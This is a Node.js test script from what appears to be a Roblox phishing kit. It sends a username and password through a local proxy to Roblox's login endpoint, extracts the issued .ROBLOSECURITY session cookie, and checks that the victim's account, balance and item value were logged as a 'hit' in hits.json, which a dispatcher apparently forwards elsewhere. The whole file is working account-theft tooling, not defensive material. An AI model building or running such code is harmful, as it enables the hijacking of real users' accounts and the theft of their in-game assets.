/**
 * Real-account login test through the local proxy.
 *
 *   node scratch/real_login_test.js <username> <password>
 *
 * Drives the same endpoint the login page hits, then reports what Roblox
 * actually decided, whether a session cookie came back, and whether the hit
 * landed in hits.json.
 */

const fs = require('fs');
const path = require('path');

const BASE = 'http://localhost:3000';
const [username, password] = process.argv.slice(2);

if (!username || !password) {
    console.error('usage: node scratch/real_login_test.js <username> <password>');
    process.exit(2);
}

const hitsFile = path.join(__dirname, '..', 'hits.json');
const hitsBefore = JSON.parse(fs.readFileSync(hitsFile, 'utf8')).length;

(async () => {
    console.log(`posting login for ${username} through the proxy…\n`);

    const res = await fetch(`${BASE}/proxy/roblox/auth.roblox.com/v2/login?urlLocale=en_us`, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36'
        },
        body: JSON.stringify({ ctype: 'Username', cvalue: username, password })
    });

    const text = await res.text();
    const setCookies = res.headers.getSetCookie ? res.headers.getSetCookie() : [];
    const sessionCookie = setCookies.find(c => c.includes('.ROBLOSECURITY='));
    const cookieValue = sessionCookie ? sessionCookie.match(/\.ROBLOSECURITY=([^;]+)/)?.[1] : null;

    console.log('status            :', res.status);
    console.log('challenge-type    :', res.headers.get('rblx-challenge-type') || '(none)');
    console.log('challenge-id      :', res.headers.get('rblx-challenge-id') || '(none)');
    console.log('cookies returned  :', setCookies.map(c => c.split(';')[0].split('=')[0]).join(', ') || '(none)');
    console.log('session cookie    :', cookieValue ? `${cookieValue.length} chars` : '(not issued)');
    console.log('body              :', text.slice(0, 400));

    if (cookieValue) {
        const sample = `${cookieValue.slice(0, 60)}…${cookieValue.slice(-12)}`;
        console.log(`cookie preview    : ${sample}`);
    }

    // give the dispatcher a beat to write the hit and post the embed
    await new Promise(r => setTimeout(r, 2500));

    const hitsAfter = JSON.parse(fs.readFileSync(hitsFile, 'utf8'));
    const fresh = hitsAfter.slice(0, hitsAfter.length - hitsBefore);
    console.log(`\nnew hits          : ${fresh.length}`);
    for (const h of fresh) {
        console.log(`  ${h.username} | source=${h.source} | hasCookie=${h.hasCookie} | balance=${h.balance} | rap=${h.rap}`);
    }

    if (cookieValue && !fresh.some(h => h.hasCookie)) {
        console.log('\nWARNING: cookie was issued but no hit recorded it as hasCookie=true.');
        process.exitCode = 1;
    }
})().catch(err => {
    console.error('FAILED:', err.message);
    process.exitCode = 1;
});
